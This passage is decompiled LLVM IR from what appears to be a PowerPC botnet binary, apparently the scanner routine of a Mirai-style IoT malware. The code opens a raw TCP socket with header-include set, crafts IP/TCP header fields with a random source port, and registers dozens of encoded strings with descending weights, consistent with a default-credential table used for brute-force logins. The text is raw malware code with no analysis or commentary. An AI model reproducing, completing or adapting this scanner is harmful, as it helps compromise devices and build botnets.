  %v1_10008938 = phi i32 [ %v1_10008938.pre, %dec_label_pc_10008928.dec_label_pc_10008928_crit_edge ], [ %v2_100088f4, %dec_label_pc_100088cc ]
  %v0_10008934 = phi i32 [ %v0_10008948, %dec_label_pc_10008928.dec_label_pc_10008928_crit_edge ], [ 0, %dec_label_pc_100088cc ]
  %v1_10008928 = mul i32 %v0_10008934, 256
  store i32 %v1_10008928, i32* %r0.global-to-local, align 4
  %v2_10008930 = mul i32 %v0_10008934, 288
  %v1_10008934 = add i32 %v0_10008934, 1
  store i32 %v1_10008934, i32* %r10.global-to-local, align 4
  %v2_10008938 = add i32 %v2_10008930, %v1_10008938
  store i32 %v2_10008938, i32* %r9.global-to-local, align 4
  %v2_1000893c = inttoptr i32 %v1_1000893c to i32*
  store i32 %v0_1000893c, i32* %v2_1000893c, align 4
  %v0_10008940 = load i32, i32* %r7.global-to-local, align 4
  %v1_10008940 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008940 = add i32 %v1_10008940, 12
  %v3_10008940 = inttoptr i32 %v2_10008940 to i32*
  store i32 %v0_10008940, i32* %v3_10008940, align 4
  %v0_10008944 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008944 = add i32 %v0_10008944, 288
  store i32 %v1_10008944, i32* %r11.global-to-local, align 4
  %v0_10008948 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10008948, i32* %r9.global-to-local, align 4
  %v0_1000894c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000894c = add i32 %v0_1000894c, -1
  store i32 %v1_1000894c, i32* %ctr.global-to-local, align 4
  %v2_1000894c = icmp eq i32 %v1_1000894c, 0
  br i1 %v2_1000894c, label %dec_label_pc_10008950, label %dec_label_pc_10008928.dec_label_pc_10008928_crit_edge

dec_label_pc_10008928.dec_label_pc_10008928_crit_edge: ; preds = %dec_label_pc_10008928
  %v1_10008938.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1000893c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10008928

dec_label_pc_10008950:                            ; preds = %dec_label_pc_10008928
  store i32 256, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r4.global-to-local, align 4
  store i64 256, i64* %stack_var_-1900, align 8
  store i32 268470632, i32* @lr, align 4
  %v3_10008964 = call i32 @function_1000c1bc(i32 2, i32 3, i32 6)
  store i32 %v3_10008964, i32* %r3.global-to-local, align 4
  %v1_10008968 = icmp slt i32 %v3_10008964, -1
  %v3_10008968 = icmp eq i32 %v3_10008964, -1
  store i1 %v1_10008968, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008968, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_10008964, i32* @r29, align 4
  store i32 %v3_10008964, i32* @global_var_1001eb40.192, align 4
  br i1 %v3_10008968, label %dec_label_pc_100095cc, label %dec_label_pc_1000897c

dec_label_pc_1000897c:                            ; preds = %dec_label_pc_10008950
  store i32 3, i32* @r4, align 4
  store i32 268470668, i32* @lr, align 4
  %v1_10008988 = call i32 @function_1000b2c0(i32 3)
  store i32 4, i32* @r4, align 4
  %v0_10008994 = load i32, i32* @r29, align 4
  store i32 %v0_10008994, i32* %r3.global-to-local, align 4
  store i32 268470688, i32* @lr, align 4
  %v2_1000899c = call i32 @function_1000b2c0(i32 %v0_10008994)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_100089a4 = load i32, i32* @global_var_1001eb40.192, align 4
  store i32 %v3_100089a4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_100089b4 = ptrtoint i64* %stack_var_-1900 to i32
  store i32 %v2_100089b4, i32* %r6.global-to-local, align 4
  store i32 4, i32* %r7.global-to-local, align 4
  store i64 1, i64* %stack_var_-1900, align 8
  store i32 268470724, i32* @lr, align 4
  %v5_100089c0 = call i32 @function_1000c180(i32 %v3_100089a4, i32 0, i32 3, i32 %v2_100089b4, i32 4)
  store i32 %v5_100089c0, i32* %r3.global-to-local, align 4
  %v1_100089c4 = icmp slt i32 %v5_100089c0, 0
  %v3_100089c4 = icmp eq i32 %v5_100089c0, 0
  store i1 %v1_100089c4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100089c4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100089c4, label %dec_label_pc_100089cc, label %dec_label_pc_1000a20c

dec_label_pc_100089cc:                            ; preds = %dec_label_pc_1000897c, %dec_label_pc_100089cc
  %v0_100089cc = call i32 @function_10007ca8()
  store i32 %v0_100089cc, i32* %r3.global-to-local, align 4
  %v1_100089d0 = urem i32 %v0_100089cc, 65536
  store i32 %v1_100089d0, i32* @r16, align 4
  %v1_100089d4 = icmp ult i32 %v1_100089d0, 1023
  %v3_100089d4 = icmp eq i32 %v1_100089d0, 1023
  store i1 %v1_100089d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100089d4, i1* %cr7_eq.global-to-local, align 1
  %tmp106 = icmp ult i32 %v1_100089d0, 1024
  br i1 %tmp106, label %dec_label_pc_100089cc, label %dec_label_pc_100089dc

dec_label_pc_100089dc:                            ; preds = %dec_label_pc_100089cc
  store i32 268566528, i32* %r11.global-to-local, align 4
  store i32 5, i32* %r29.global-to-local, align 4
  %v3_100089e4 = load i32, i32* @global_var_1001ebcc.193, align 4
  store i32 %v3_100089e4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001ebcc.193 to i32), i32* @r30, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_100089f4 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_100089f4, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r28.global-to-local, align 4
  %v1_100089fc = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_100089fc, i32* %r0.global-to-local, align 4
  store i32 40, i32* %r9.global-to-local, align 4
  store i32 %v1_100089fc, i32* @global_var_1001ebcc.193, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1000e0a0.195 to i32), i32* @r28, align 4
  store i16 40, i16* bitcast (i32* @global_var_1001ebce.196 to i16*), align 4
  %v0_10008a10 = call i32 @function_10007ca8()
  %v1_10008a10 = trunc i32 %v0_10008a10 to i16
  store i32 %v0_10008a10, i32* %r3.global-to-local, align 4
  %v3_10008a14 = load i32, i32* @global_var_1001ebec.197, align 4
  store i32 %v3_10008a14, i32* %r11.global-to-local, align 4
  store i32 64, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r9.global-to-local, align 4
  store i8 64, i8* bitcast (i32* @global_var_1001ebd4.198 to i8*), align 4
  %v1_10008a24 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  store i32 %v1_10008a24, i32* %r11.global-to-local, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v0_10008a2c = load i32, i32* %r9.global-to-local, align 4
  %v1_10008a2c = trunc i32 %v0_10008a2c to i8
  store i8 %v1_10008a2c, i8* bitcast (i32* @global_var_1001ebd5.199 to i8*), align 4
  store i16 %v1_10008a10, i16* bitcast (i32* @global_var_1001ebd0.200 to i16*), align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1000e0b8.201 to i32), i32* @r27, align 4
  store i32 %v1_10008a24, i32* @global_var_1001ebec.197, align 4
  store i16 23, i16* @global_var_1001ebe2.202, align 2
  store i32 ptrtoint (i32* @global_var_1000e0c0.203 to i32), i32* @r26, align 4
  %v0_10008a4c = load i32, i32* @r16, align 4
  %v1_10008a4c = trunc i32 %v0_10008a4c to i16
  store i16 %v1_10008a4c, i16* bitcast (i32* @global_var_1001ebe0.194 to i16*), align 4
  store i32 268500992, i32* %r25.global-to-local, align 4
  %v0_10008a54 = call i32 @function_10007ca8()
  %v1_10008a54 = trunc i32 %v0_10008a54 to i16
  store i16 %v1_10008a54, i16* bitcast (i32* @global_var_1001ebee.204 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_1000e0a8.205 to i32), i32* %r4.global-to-local, align 4
  %v0_10008a64 = load i32, i32* @r28, align 4
  store i32 %v0_10008a64, i32* %r3.global-to-local, align 4
  %v3_10008a6c = load i32, i32* @global_var_1001ebec.197, align 4
  store i32 ptrtoint (i32* @global_var_1000e0e4.206 to i32), i32* @r25, align 4
  %v1_10008a7c = or i32 %v3_10008a6c, 131072
  store i32 %v1_10008a7c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e0ec.207 to i32), i32* @r24, align 4
  store i32 %v1_10008a7c, i32* @global_var_1001ebec.197, align 4
  store i32 ptrtoint (i32* @global_var_1000de5c.208 to i32), i32* @r29, align 4
  store i32 268470936, i32* @lr, align 4
  %v4_10008a94 = call i32 @function_10008658(i32 %v0_10008a64, i32 ptrtoint (i32* @global_var_1000e0a8.205 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1000e0b0.209 to i32), i32* %r4.global-to-local, align 4
  %v0_10008aa0 = load i32, i32* @r28, align 4
  store i32 %v0_10008aa0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1000df38.210 to i32), i32* @r23, align 4
  store i32 268470960, i32* @lr, align 4
  %v5_10008aac = call i32 @function_10008658(i32 %v0_10008aa0, i32 ptrtoint ([6 x i8]* @global_var_1000e0b0.209 to i32), i32 9)
  %v0_10008ab4 = load i32, i32* @r28, align 4
  store i32 %v0_10008ab4, i32* %r3.global-to-local, align 4
  %v0_10008ab8 = load i32, i32* @r27, align 4
  store i32 %v0_10008ab8, i32* %r4.global-to-local, align 4
  store i32 268470976, i32* @lr, align 4
  %v5_10008abc = call i32 @function_10008658(i32 %v0_10008ab4, i32 %v0_10008ab8, i32 8)
  %v0_10008ac0 = load i32, i32* @r27, align 4
  store i32 %v0_10008ac0, i32* %r3.global-to-local, align 4
  store i32 %v0_10008ac0, i32* %r4.global-to-local, align 4
  store i32 268470992, i32* @lr, align 4
  %v5_10008acc = call i32 @function_10008658(i32 %v0_10008ac0, i32 %v0_10008ac0, i32 7)
  %v0_10008ad0 = load i32, i32* @r28, align 4
  store i32 %v0_10008ad0, i32* %r3.global-to-local, align 4
  %v0_10008ad4 = load i32, i32* @r26, align 4
  store i32 %v0_10008ad4, i32* %r4.global-to-local, align 4
  store i32 268471008, i32* @lr, align 4
  %v4_10008adc = call i32 @function_10008658(i32 %v0_10008ad0, i32 %v0_10008ad4, i32 6)
  store i32 ptrtoint ([8 x i8]* @global_var_1000e0c8.211 to i32), i32* %r4.global-to-local, align 4
  %v0_10008ae8 = load i32, i32* @r28, align 4
  store i32 %v0_10008ae8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1000df44.212 to i32), i32* @r22, align 4
  store i32 268471032, i32* @lr, align 4
  %v5_10008af4 = call i32 @function_10008658(i32 %v0_10008ae8, i32 ptrtoint ([8 x i8]* @global_var_1000e0c8.211 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_1000e0d0.213 to i32), i32* %r4.global-to-local, align 4
  %v0_10008b00 = load i32, i32* @r28, align 4
  store i32 %v0_10008b00, i32* %r3.global-to-local, align 4
  store i32 268500992, i32* %r21.global-to-local, align 4
  store i32 268471056, i32* @lr, align 4
  %v5_10008b0c = call i32 @function_10008658(i32 %v0_10008b00, i32 ptrtoint ([8 x i8]* @global_var_1000e0d0.213 to i32), i32 5)
  store i32 ptrtoint ([9 x i8]* @global_var_1000e0d8.214 to i32), i32* %r4.global-to-local, align 4
  %v0_10008b18 = load i32, i32* @r28, align 4
  store i32 %v0_10008b18, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1000df4c.215 to i32), i32* %r21.global-to-local, align 4
  store i32 268471080, i32* @lr, align 4
  %v5_10008b24 = call i32 @function_10008658(i32 %v0_10008b18, i32 ptrtoint ([9 x i8]* @global_var_1000e0d8.214 to i32), i32 5)
  %v0_10008b28 = load i32, i32* @r28, align 4
  store i32 %v0_10008b28, i32* %r3.global-to-local, align 4
  %v0_10008b2c = load i32, i32* @r25, align 4
  store i32 %v0_10008b2c, i32* %r4.global-to-local, align 4
  store i32 268471096, i32* @lr, align 4
  %v4_10008b34 = call i32 @function_10008658(i32 %v0_10008b28, i32 %v0_10008b2c, i32 5)
  %v0_10008b38 = load i32, i32* @r28, align 4
  store i32 %v0_10008b38, i32* %r3.global-to-local, align 4
  %v0_10008b3c = load i32, i32* @r24, align 4
  store i32 %v0_10008b3c, i32* %r4.global-to-local, align 4
  store i32 268471112, i32* @lr, align 4
  %v4_10008b44 = call i32 @function_10008658(i32 %v0_10008b38, i32 %v0_10008b3c, i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_1000e0f4.216 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1000e0f4.216 to i32), i32* %r4.global-to-local, align 4
  store i32 268500992, i32* %r20.global-to-local, align 4
  store i32 268471136, i32* @lr, align 4
  %v4_10008b5c = call i32 @function_10008658(i32 ptrtoint ([8 x i8]* @global_var_1000e0f4.216 to i32), i32 5, i32 5)
  %v0_10008b60 = load i32, i32* @r29, align 4
  store i32 %v0_10008b60, i32* %r4.global-to-local, align 4
  %v0_10008b64 = load i32, i32* @r28, align 4
  store i32 %v0_10008b64, i32* %r3.global-to-local, align 4
  store i32 268471152, i32* @lr, align 4
  %v4_10008b6c = call i32 @function_10008658(i32 %v0_10008b64, i32 %v0_10008b60, i32 4)
  %v0_10008b74 = load i32, i32* @r27, align 4
  store i32 %v0_10008b74, i32* %r3.global-to-local, align 4
  %v0_10008b78 = load i32, i32* @r23, align 4
  store i32 %v0_10008b78, i32* %r4.global-to-local, align 4
  store i32 268471168, i32* @lr, align 4
  %v5_10008b7c = call i32 @function_10008658(i32 %v0_10008b74, i32 %v0_10008b78, i32 4)
  %v0_10008b80 = load i32, i32* @r28, align 4
  store i32 %v0_10008b80, i32* %r3.global-to-local, align 4
  store i32 %v0_10008b80, i32* %r4.global-to-local, align 4
  store i32 268471184, i32* @lr, align 4
  %v5_10008b8c = call i32 @function_10008658(i32 %v0_10008b80, i32 %v0_10008b80, i32 4)
  %v0_10008b90 = load i32, i32* @r28, align 4
  store i32 %v0_10008b90, i32* %r3.global-to-local, align 4
  %v0_10008b94 = load i32, i32* @r22, align 4
  store i32 %v0_10008b94, i32* %r4.global-to-local, align 4
  store i32 268471200, i32* @lr, align 4
  %sext = mul i32 %v0_10008b94, 16777216
  %v3_10008b9c = sdiv i32 %sext, 16777216
  %v5_10008b9c = call i32 @function_10008658(i32 %v0_10008b90, i32 %v3_10008b9c, i32 4)
  %v0_10008ba4 = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_10008ba4, i32* %r3.global-to-local, align 4
  store i32 %v0_10008ba4, i32* %r4.global-to-local, align 4
  store i32 268471216, i32* @lr, align 4
  %v5_10008bac = call i32 @function_10008658(i32 %v0_10008ba4, i32 %v0_10008ba4, i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_1000df54.217 to i32), i32* %r20.global-to-local, align 4
  %v0_10008bb4 = load i32, i32* @r29, align 4
  store i32 %v0_10008bb4, i32* %r4.global-to-local, align 4
  %v0_10008bb8 = load i32, i32* @r27, align 4
  store i32 %v0_10008bb8, i32* %r3.global-to-local, align 4
  store i32 268500992, i32* @r29, align 4
  store i32 268471240, i32* @lr, align 4
  %v4_10008bc4 = call i32 @function_10008658(i32 %v0_10008bb8, i32 %v0_10008bb4, i32 3)
  %v0_10008bc8 = load i32, i32* @r28, align 4
  store i32 %v0_10008bc8, i32* %r3.global-to-local, align 4
  %v0_10008bcc = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10008bcc, i32* %r4.global-to-local, align 4
  store i32 268471256, i32* @lr, align 4
  %v5_10008bd4 = call i32 @function_10008658(i32 %v0_10008bc8, i32 %v0_10008bcc, i32 3)
  store i32 ptrtoint (i32* @global_var_1000df68.218 to i32), i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_1000df5c.219 to i32), i32* %r4.global-to-local, align 4
  %v0_10008be4 = load i32, i32* @r27, align 4
  store i32 %v0_10008be4, i32* %r3.global-to-local, align 4
  store i32 268471280, i32* @lr, align 4
  %v4_10008bec = call i32 @function_10008658(i32 %v0_10008be4, i32 ptrtoint (i32* @global_var_1000df5c.219 to i32), i32 3)
  %v0_10008bf0 = load i32, i32* @r29, align 4
  store i32 %v0_10008bf0, i32* %r4.global-to-local, align 4
  %v0_10008bf4 = load i32, i32* @r28, align 4
  store i32 %v0_10008bf4, i32* %r3.global-to-local, align 4
  store i32 268471296, i32* @lr, align 4
  %v4_10008bfc = call i32 @function_10008658(i32 %v0_10008bf4, i32 %v0_10008bf0, i32 3)
  store i32 ptrtoint ([9 x i8]* @global_var_1000df70.220 to i32), i32* %r4.global-to-local, align 4
  %v0_10008c0c = load i32, i32* @r27, align 4
  store i32 %v0_10008c0c, i32* %r3.global-to-local, align 4
  store i32 268500992, i32* %r19.global-to-local, align 4
  store i32 268471320, i32* @lr, align 4
  %v5_10008c14 = call i32 @function_10008658(i32 %v0_10008c0c, i32 ptrtoint ([9 x i8]* @global_var_1000df70.220 to i32), i32 3)
  store i32 ptrtoint (i32* @global_var_1000df7c.221 to i32), i32* %r19.global-to-local, align 4
  %v0_10008c1c = load i32, i32* @r29, align 4
  store i32 %v0_10008c1c, i32* %r4.global-to-local, align 4
  %v0_10008c20 = load i32, i32* @r27, align 4
  store i32 %v0_10008c20, i32* %r3.global-to-local, align 4
  store i32 268500992, i32* %r18.global-to-local, align 4
  store i32 268471344, i32* @lr, align 4
  %v4_10008c2c = call i32 @function_10008658(i32 %v0_10008c20, i32 %v0_10008c1c, i32 2)
  %v0_10008c34 = load i32, i32* @r28, align 4
  store i32 %v0_10008c34, i32* %r3.global-to-local, align 4
  %v0_10008c38 = load i32, i32* %r19.global-to-local, align 4
  store i32 %v0_10008c38, i32* %r4.global-to-local, align 4
  store i32 268471360, i32* @lr, align 4
  %v4_10008c3c = call i32 @function_10008658(i32 %v0_10008c34, i32 %v0_10008c38, i32 2)
  store i32 ptrtoint (i32* @global_var_1000df84.222 to i32), i32* %r18.global-to-local, align 4
  %v0_10008c44 = load i32, i32* @r28, align 4
  store i32 %v0_10008c44, i32* %r3.global-to-local, align 4
  %v0_10008c48 = load i32, i32* @r23, align 4
  store i32 %v0_10008c48, i32* %r4.global-to-local, align 4
  store i32 268500992, i32* %r17.global-to-local, align 4
  store i32 268471384, i32* @lr, align 4
  %v5_10008c54 = call i32 @function_10008658(i32 %v0_10008c44, i32 %v0_10008c48, i32 2)
  %v0_10008c58 = load i32, i32* @r28, align 4
  store i32 %v0_10008c58, i32* %r3.global-to-local, align 4
  %v0_10008c5c = load i32, i32* %r18.global-to-local, align 4
  store i32 %v0_10008c5c, i32* %r4.global-to-local, align 4
  store i32 268471400, i32* @lr, align 4
  %v4_10008c64 = call i32 @function_10008658(i32 %v0_10008c58, i32 %v0_10008c5c, i32 2)
  store i32 ptrtoint (i32* @global_var_1000df8c.223 to i32), i32* %r4.global-to-local, align 4
  %v0_10008c70 = load i32, i32* @r28, align 4
  store i32 %v0_10008c70, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000dfa4.224 to i32), i32* %r17.global-to-local, align 4
  store i32 268471424, i32* @lr, align 4
  %v4_10008c7c = call i32 @function_10008658(i32 %v0_10008c70, i32 ptrtoint (i32* @global_var_1000df8c.223 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_1000df94.225 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000dfa4.224 to i32), i32* %r4.global-to-local, align 4
  store i32 268500992, i32* @r29, align 4
  store i32 268471448, i32* @lr, align 4
  %v5_10008c94 = call i32 @function_10008658(i32 ptrtoint ([14 x i8]* @global_var_1000df94.225 to i32), i32 ptrtoint ([7 x i8]* @global_var_1000dfa4.224 to i32), i32 1)
  store i32 ptrtoint ([8 x i8]* @global_var_1000dfac.226 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1000dfac.226 to i32), i32* %r4.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1000dfc0.227 to i32), i32* @r29, align 4
  store i32 268471472, i32* @lr, align 4
  %v4_10008cac = call i32 @function_10008658(i32 ptrtoint ([8 x i8]* @global_var_1000dfac.226 to i32), i32 1, i32 1)
  store i32 ptrtoint ([11 x i8]* @global_var_1000dfb4.228 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1000dfb4.228 to i32), i32* %r4.global-to-local, align 4
  store i32 268471496, i32* @lr, align 4
  %v4_10008cc4 = call i32 @function_10008658(i32 ptrtoint ([11 x i8]* @global_var_1000dfb4.228 to i32), i32 1, i32 1)
  %v0_10008cc8 = load i32, i32* @r29, align 4
  store i32 %v0_10008cc8, i32* %r3.global-to-local, align 4
  store i32 %v0_10008cc8, i32* %r4.global-to-local, align 4
  store i32 268471512, i32* @lr, align 4
  %v5_10008cd4 = call i32 @function_10008658(i32 %v0_10008cc8, i32 %v0_10008cc8, i32 1)
  %v0_10008cd8 = load i32, i32* @r29, align 4
  store i32 %v0_10008cd8, i32* %r3.global-to-local, align 4
  %v0_10008cdc = load i32, i32* @r22, align 4
  store i32 %v0_10008cdc, i32* %r4.global-to-local, align 4
  store i32 268471528, i32* @lr, align 4
  %sext6 = mul i32 %v0_10008cdc, 16777216
  %v3_10008ce4 = sdiv i32 %sext6, 16777216
  %v5_10008ce4 = call i32 @function_10008658(i32 %v0_10008cd8, i32 %v3_10008ce4, i32 1)
  %v0_10008ce8 = load i32, i32* @r29, align 4
  store i32 %v0_10008ce8, i32* %r3.global-to-local, align 4
  %v0_10008cec = load i32, i32* @r22, align 4
  store i32 %v0_10008cec, i32* %r4.global-to-local, align 4
  store i32 268471544, i32* @lr, align 4
  %sext7 = mul i32 %v0_10008cec, 16777216
  %v3_10008cf4 = sdiv i32 %sext7, 16777216
  %v5_10008cf4 = call i32 @function_10008658(i32 %v0_10008ce8, i32 %v3_10008cf4, i32 1)
  store i32 ptrtoint (i32* @global_var_1000dfc8.229 to i32), i32* %r3.global-to-local, align 4
  %v0_10008d00 = load i32, i32* @r23, align 4
  store i32 %v0_10008d00, i32* %r4.global-to-local, align 4
  store i32 268500992, i32* @r29, align 4
  store i32 268471568, i32* @lr, align 4
  %v4_10008d0c = call i32 @function_10008658(i32 ptrtoint (i32* @global_var_1000dfc8.229 to i32), i32 %v0_10008d00, i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_1000dfd0.230 to i32), i32* %r3.global-to-local, align 4
  %v0_10008d1c = load i32, i32* %r18.global-to-local, align 4
  store i32 %v0_10008d1c, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e028.231 to i32), i32* @r29, align 4
  store i32 268471592, i32* @lr, align 4
  %v4_10008d24 = call i32 @function_10008658(i32 ptrtoint ([14 x i8]* @global_var_1000dfd0.230 to i32), i32 %v0_10008d1c, i32 1)
  %v0_10008d28 = load i32, i32* %r19.global-to-local, align 4
  store i32 %v0_10008d28, i32* %r3.global-to-local, align 4
  store i32 %v0_10008d28, i32* %r4.global-to-local, align 4
  store i32 268471608, i32* @lr, align 4
  %v3_10008d34 = call i32 @function_10008658(i32 %v0_10008d28, i32 %v0_10008d28, i32 1)
  %v0_10008d38 = load i32, i32* @r26, align 4
  store i32 %v0_10008d38, i32* %r3.global-to-local, align 4
  store i32 %v0_10008d38, i32* %r4.global-to-local, align 4
  store i32 268471624, i32* @lr, align 4
  %v3_10008d44 = call i32 @function_10008658(i32 %v0_10008d38, i32 %v0_10008d38, i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1000dfe0.232 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1000dfe0.232 to i32), i32* %r4.global-to-local, align 4
  store i32 268471644, i32* @lr, align 4
  %v4_10008d58 = call i32 @function_10008658(i32 ptrtoint ([5 x i8]* @global_var_1000dfe0.232 to i32), i32 1, i32 1)
  store i32 ptrtoint (i32* @global_var_1000dfe8.233 to i32), i32* %r4.global-to-local, align 4
  %v0_10008d64 = load i32, i32* @r28, align 4
  store i32 %v0_10008d64, i32* %r3.global-to-local, align 4
  store i32 268471664, i32* @lr, align 4
  %v4_10008d6c = call i32 @function_10008658(i32 %v0_10008d64, i32 ptrtoint (i32* @global_var_1000dfe8.233 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_1000dff0.234 to i32), i32* %r4.global-to-local, align 4
  %v0_10008d78 = load i32, i32* @r28, align 4
  store i32 %v0_10008d78, i32* %r3.global-to-local, align 4
  store i32 268471684, i32* @lr, align 4
  %v4_10008d80 = call i32 @function_10008658(i32 %v0_10008d78, i32 ptrtoint (i32* @global_var_1000dff0.234 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_1000dff8.235 to i32), i32* %r4.global-to-local, align 4
  %v0_10008d8c = load i32, i32* @r28, align 4
  store i32 %v0_10008d8c, i32* %r3.global-to-local, align 4
  store i32 268471704, i32* @lr, align 4
  %v4_10008d94 = call i32 @function_10008658(i32 %v0_10008d8c, i32 ptrtoint (i32* @global_var_1000dff8.235 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1000e000.236 to i32), i32* %r4.global-to-local, align 4
  %v0_10008da0 = load i32, i32* @r28, align 4
  store i32 %v0_10008da0, i32* %r3.global-to-local, align 4
  store i32 268471724, i32* @lr, align 4
  %v5_10008da8 = call i32 @function_10008658(i32 %v0_10008da0, i32 ptrtoint ([6 x i8]* @global_var_1000e000.236 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1000e008.237 to i32), i32* %r4.global-to-local, align 4
  %v0_10008db4 = load i32, i32* @r28, align 4
  store i32 %v0_10008db4, i32* %r3.global-to-local, align 4
  store i32 268471744, i32* @lr, align 4
  %v5_10008dbc = call i32 @function_10008658(i32 %v0_10008db4, i32 ptrtoint ([5 x i8]* @global_var_1000e008.237 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_1000e010.238 to i32), i32* %r4.global-to-local, align 4
  %v0_10008dc8 = load i32, i32* @r28, align 4
  store i32 %v0_10008dc8, i32* %r3.global-to-local, align 4
  store i32 268471764, i32* @lr, align 4
  %v5_10008dd0 = call i32 @function_10008658(i32 %v0_10008dc8, i32 ptrtoint ([6 x i8]* @global_var_1000e010.238 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_1000e018.239 to i32), i32* %r4.global-to-local, align 4
  %v0_10008ddc = load i32, i32* @r28, align 4
  store i32 %v0_10008ddc, i32* %r3.global-to-local, align 4
  store i32 268471784, i32* @lr, align 4
  %v4_10008de4 = call i32 @function_10008658(i32 %v0_10008ddc, i32 ptrtoint (i32* @global_var_1000e018.239 to i32), i32 1)
  %v0_10008de8 = load i32, i32* @r28, align 4
  store i32 %v0_10008de8, i32* %r3.global-to-local, align 4
  %v0_10008dec = load i32, i32* @r29, align 4
  store i32 %v0_10008dec, i32* %r4.global-to-local, align 4
  store i32 268471800, i32* @lr, align 4
  %v4_10008df4 = call i32 @function_10008658(i32 %v0_10008de8, i32 %v0_10008dec, i32 1)
  store i32 ptrtoint ([7 x i8]* @global_var_1000e038.240 to i32), i32* %r4.global-to-local, align 4
  %v0_10008e00 = load i32, i32* @r28, align 4
  store i32 %v0_10008e00, i32* %r3.global-to-local, align 4
  store i32 268471820, i32* @lr, align 4
  %v5_10008e08 = call i32 @function_10008658(i32 %v0_10008e00, i32 ptrtoint ([7 x i8]* @global_var_1000e038.240 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1000e040.241 to i32), i32* %r4.global-to-local, align 4
  %v0_10008e14 = load i32, i32* @r28, align 4
  store i32 %v0_10008e14, i32* %r3.global-to-local, align 4
  store i32 268471840, i32* @lr, align 4
  %v5_10008e1c = call i32 @function_10008658(i32 %v0_10008e14, i32 ptrtoint ([5 x i8]* @global_var_1000e040.241 to i32), i32 1)
  store i32 ptrtoint ([9 x i8]* @global_var_1000e048.242 to i32), i32* %r4.global-to-local, align 4
  %v0_10008e2c = load i32, i32* @r28, align 4
  store i32 %v0_10008e2c, i32* %r3.global-to-local, align 4
  store i32 268471860, i32* @lr, align 4
  %v5_10008e30 = call i32 @function_10008658(i32 %v0_10008e2c, i32 ptrtoint ([9 x i8]* @global_var_1000e048.242 to i32), i32 1)
  %v0_10008e34 = load i32, i32* @r28, align 4
  store i32 %v0_10008e34, i32* %r3.global-to-local, align 4
  %v0_10008e38 = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_10008e38, i32* %r4.global-to-local, align 4
  store i32 268471876, i32* @lr, align 4
  %v5_10008e40 = call i32 @function_10008658(i32 %v0_10008e34, i32 %v0_10008e38, i32 1)
  store i32 ptrtoint ([8 x i8]* @global_var_1000e054.243 to i32), i32* %r4.global-to-local, align 4
  %v0_10008e4c = load i32, i32* @r28, align 4
  store i32 %v0_10008e4c, i32* %r3.global-to-local, align 4
  store i32 268471896, i32* @lr, align 4
  %v5_10008e54 = call i32 @function_10008658(i32 %v0_10008e4c, i32 ptrtoint ([8 x i8]* @global_var_1000e054.243 to i32), i32 1)
  %v0_10008e5c = load i32, i32* @r28, align 4
  store i32 %v0_10008e5c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e05c.244 to i32), i32* %r4.global-to-local, align 4
  store i32 268471916, i32* @lr, align 4
